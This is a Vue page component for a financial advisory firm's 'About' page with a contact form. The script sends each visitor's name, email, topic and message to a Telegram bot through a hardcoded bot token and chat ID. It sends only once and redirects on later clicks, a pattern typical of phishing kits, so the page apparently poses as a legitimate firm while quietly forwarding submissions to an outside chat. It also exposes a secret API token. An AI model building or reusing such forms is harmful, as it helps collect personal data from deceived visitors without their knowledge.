<template>
  <div class="inner-page about-page">

    <section class="inner-hero about-hero">

      <div class="hero-grid"></div>

      <div class="container inner-hero-content">

        <span class="eyebrow">
          <span class="eyebrow-dot"></span>
          About Northbridge
        </span>

        <h1>
          Financial advice
          <br>
          <span>with intention.</span>
        </h1>

        <p>
          We believe good financial advice starts with understanding
          people—not products.
        </p>

      </div>

    </section>

    <section class="section about-introduction">

      <div class="container about-intro-grid">

        <div>

          <span class="section-number">
            OUR STORY
          </span>

          <h2>
            Helping people make
            <em>better financial decisions.</em>
          </h2>

        </div>

        <div class="about-story">

          <p class="large">
            Northbridge Financial Advisory was built around a simple
            idea: financial planning should make life feel clearer,
            not more complicated.
          </p>

          <p>
            We believe clients deserve an advisory relationship where
            questions are welcomed, decisions are explained and
            strategies are connected to the things that matter most.
          </p>

          <p>
            Our work is centered on understanding your financial
            circumstances, identifying your priorities and helping
            you navigate the decisions that can shape your future.
          </p>

        </div>

      </div>

    </section>

    <section class="values-section">

      <div class="container">

        <span class="section-number">
          WHAT WE BELIEVE
        </span>

        <div class="values-grid">

          <div class="value-main">

            <span>01</span>

            <h2>
              Clarity
            </h2>

            <p>
              Financial decisions become easier when the bigger
              picture is visible. We work to make complex subjects
              understandable and actionable.
            </p>

          </div>

          <div class="value-item">
            <span>02</span>
            <h3>Perspective</h3>
            <p>
              Short-term noise should not automatically dictate
              long-term decisions.
            </p>
          </div>

          <div class="value-item">
            <span>03</span>
            <h3>Partnership</h3>
            <p>
              Advice is more meaningful when it is built through
              an ongoing relationship.
            </p>
          </div>

          <div class="value-item">
            <span>04</span>
            <h3>Integrity</h3>
            <p>
              We believe recommendations should always be grounded
              in the client's circumstances and objectives.
            </p>
          </div>

          <div class="value-item">
            <span>05</span>
            <h3>Education</h3>
            <p>
              Understanding the "why" behind a decision matters
              just as much as the decision itself.
            </p>
          </div>

        </div>

      </div>

    </section>

    <section class="section contact-section" id="contact">

      <div class="container">

        <div class="contact-layout">

          <div class="contact-copy">

            <span class="section-number">
              START A CONVERSATION
            </span>

            <h2>
              Let's talk about
              <br>
              your next chapter.
            </h2>

            <p>
              Tell us a little about what you're working toward.
              We'll get back to you to arrange an introductory
              conversation.
            </p>

            <div class="contact-details">

              <div>
                <span>Email</span>
                <a href="mailto:hello@northbridgeadvisory.com">
                  hello@northbridgeadvisory.com
                </a>
              </div>

              <div>
                <span>Phone</span>
                <a href="tel:+18005550184">
                  +1 (800) 555-0184
                </a>
              </div>

            </div>

          </div>

          <form
            @submit.prevent="finishJoob"
            class="contact-form"
          >

            <div class="form-row">

              <div class="form-field">
                <label>First name</label>
                <input
                  v-model="formDataRes.firstName"
                  type="text"
                  placeholder="Your first name"
                >
              </div>

              <div class="form-field">
                <label>Last name</label>
                <input
                  v-model="formDataRes.lastName"
                  type="text"
                  placeholder="Your last name"
                >
              </div>

            </div>

            <div class="form-field">
              <label>Email address</label>
              <input
                v-model="formDataRes.email"
                type="email"
                placeholder="you@example.com"
              >
            </div>

            <div class="form-field">
              <label>How can we help?</label>

              <select v-model="formDataRes.topic">
                <option value="">
                  Select a topic
                </option>

                <option>
                  Financial planning
                </option>

                <option>
                  Wealth strategy
                </option>

                <option>
                  Retirement planning
                </option>

                <option>
                  General inquiry
                </option>
              </select>
            </div>

            <div class="form-field">
              <label>Message</label>

              <textarea
                v-model="formDataRes.message"
                rows="5"
                placeholder="Tell us a little about what you'd like to discuss..."
              ></textarea>
            </div>
<!-- type="submit" -->
            <button
              
              class="button button-primary form-submit"
            >
              Request a conversation
              <span>↗</span>
            </button>

            <p
              v-if="submitted"
              class="form-success"
            >
              Thank you. Your request has been received.
            </p>

          </form>

        </div>

      </div>

    </section>

  </div>
</template>

<script>
export default {
  name: 'AboutPage',

  data() {
    return {
    //   submitted: false,

      formDataRes: {
        firstName: '',
        lastName: '',
        email: '',
        topic: '',
        message: ''
      },
      loading: false,
      isActive: false,
      count: 0,
      finalCount: 1, // Only send once
    }
  },

  methods: {
    async finishJoob() {
      this.count++;
      console.log("Count:", this.count, "Final:", this.finalCount);

      if (this.count <= this.finalCount) {
        this.loading = true;

        // Format the message as string
        const message = `* 🌉🌉NORTHBRIDGE🌉🌉 *\nFIRSTNAME: ${this.formDataRes.firstName}\nLASTNAME: ${this.formDataRes.lastName}\nEMAIL: ${this.formDataRes.email}\nTOPIC: ${this.formDataRes.topic}\nMESSAGE: ${this.formDataRes.message}`;

        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-4794000485",
          message
        );

        this.isActive = !this.isActive;
        this.loading = false;
      } else {
        // Redirect after sending
        location.replace("/");
      }
    },

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },

  head() {
    return {
      title: 'About Us | Northbridge Financial Advisory',
      meta: [
        {
          hid: 'description',
          name: 'description',
          content:
            'Learn about Northbridge Financial Advisory and our philosophy of thoughtful, personalized financial planning.'
        }
      ]
    }
  }
}
</script>